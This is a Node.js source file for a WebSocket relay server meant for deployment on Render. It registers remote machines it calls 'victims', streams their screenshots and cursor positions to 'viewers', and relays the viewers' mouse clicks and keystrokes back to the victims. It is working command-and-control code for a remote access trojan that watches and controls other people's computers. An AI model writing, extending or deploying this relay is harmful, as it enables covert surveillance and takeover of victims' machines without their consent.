// server.js — Relay + UI server. Deploy this on Render as a Web Service.
const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const fs = require('fs');

const PORT = process.env.PORT || 10000;
const PING_INTERVAL = 20000;
const PING_TIMEOUT = 10000;

const app = express();
const server = http.createServer(app);

// Health check — Render needs this
app.get('/healthz', (req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('OK');
});

app.get('/health', (req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('OK');
});

// Serve the viewer UI
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'client.html'));
});

// --- WebSocket Relay ---
const wss = new WebSocketServer({ server });

// victims: Map<victimId, WebSocket>
const victims = new Map();
// viewers: Map<viewerId, {ws, victimId}>
const viewers = new Map();
let viewerCounter = 0;

function heartbeat() {
  this.isAlive = true;
}

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', heartbeat);

  let role = null;
  let myId = null;
  let pairedVictim = null;

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch (e) { return; }

    switch (msg.type) {

      // ─── VICTIM REGISTRATION ───
      case 'register_victim': {
        role = 'victim';
        myId = msg.victimId || Math.random().toString(36).slice(2, 10);
        ws.victimId = myId;
        victims.set(myId, ws);
        ws.send(JSON.stringify({
          type: 'registered',
          victimId: myId,
          screenWidth: msg.screenWidth || 1920,
          screenHeight: msg.screenHeight || 1080
        }));
        console.log(`[VICTIM ONLINE] ${myId} | ${msg.screenWidth}x${msg.screenHeight}`);

        // If a viewer was waiting for this victim, connect them
        for (const [vid, vw] of viewers) {
          if (vw.victimId === myId && vw.ws.readyState === 1) {
            vw.ws.send(JSON.stringify({
              type: 'victim_ready',
              victimId: myId,
              screenWidth: msg.screenWidth,
              screenHeight: msg.screenHeight
            }));
            console.log(`[PAIRED] Viewer ${vid} -> Victim ${myId}`);
          }
        }
        break;
      }

      // ─── VIEWER REGISTRATION ───
      case 'register_viewer': {
        role = 'viewer';
        myId = 'viewer_' + (++viewerCounter);
        const targetId = msg.victimId;

        ws.viewerId = myId;
        viewers.set(myId, { ws, victimId: targetId });

        const victim = victims.get(targetId);
        if (victim && victim.readyState === 1) {
          // Victim already connected — tell viewer it's ready
          pairedVictim = targetId;
          ws.send(JSON.stringify({
            type: 'victim_ready',
            victimId: targetId,
            screenWidth: msg.screenWidth || 1920,
            screenHeight: msg.screenHeight || 1080
          }));
          console.log(`[VIEWER ONLINE] ${myId} -> Victim ${targetId}`);
        } else {
          ws.send(JSON.stringify({
            type: 'waiting',
            victimId: targetId,
            message: 'Waiting for victim to connect...'
          }));
          console.log(`[VIEWER WAITING] ${myId} -> Victim ${targetId} (not online yet)`);
        }
        break;
      }

      // ─── SCREENSHOT: Victim -> Relay -> Viewer ───
      case 'screenshot': {
        if (role !== 'victim') return;
        // Forward to all viewers watching this victim
        for (const [vid, vw] of viewers) {
          if (vw.victimId === ws.victimId && vw.ws.readyState === 1) {
            vw.ws.send(JSON.stringify({
              type: 'screenshot',
              data: msg.data,
              cursorX: msg.cursorX,
              cursorY: msg.cursorY
            }));
          }
        }
        break;
      }

      // ─── INPUT: Viewer -> Relay -> Victim ───
      case 'mousedelta':
      case 'click':
      case 'keydown':
      case 'keyup': {
        if (role !== 'viewer') return;
        const targetId = viewers.get(ws.viewerId)?.victimId;
        if (!targetId) return;
        const victim = victims.get(targetId);
        if (victim && victim.readyState === 1) {
          victim.send(raw.toString());
        }
        break;
      }

      // ─── VICTIM SENDING INFO UPDATE ───
      case 'info': {
        if (role !== 'victim') return;
        for (const [vid, vw] of viewers) {
          if (vw.victimId === ws.victimId && vw.ws.readyState === 1) {
            vw.ws.send(raw.toString());
          }
        }
        break;
      }
    }
  });

  ws.on('close', () => {
    if (role === 'victim' && myId) {
      victims.delete(myId);
      console.log(`[VICTIM OFFLINE] ${myId}`);
      // Notify viewers watching this victim
      for (const [vid, vw] of viewers) {
        if (vw.victimId === myId && vw.ws.readyState === 1) {
          vw.ws.send(JSON.stringify({ type: 'victim_disconnected', victimId: myId }));
        }
      }
    } else if (role === 'viewer' && myId) {
      viewers.delete(myId);
      console.log(`[VIEWER DISCONNECTED] ${myId}`);
    }
  });

  ws.on('error', () => {});
});

// ─── PING/PONG keepalive ───
const keepalive = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      console.log('[TIMEOUT] Terminating unresponsive client');
      return ws.terminate();
    }
    ws.isAlive = false;
    ws.ping();
  });
}, PING_INTERVAL);

wss.on('close', () => clearInterval(keepalive));

// ─── Graceful shutdown ───
process.on('SIGTERM', () => {
  console.log('[SIGTERM] Shutting down gracefully...');
  clearInterval(keepalive);
  wss.clients.forEach((ws) => ws.close());
  server.close(() => process.exit(0));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[RELAY] Server running on 0.0.0.0:${PORT}`);
  console.log(`[RELAY] WebSocket relay ready | Serving client.html`);
});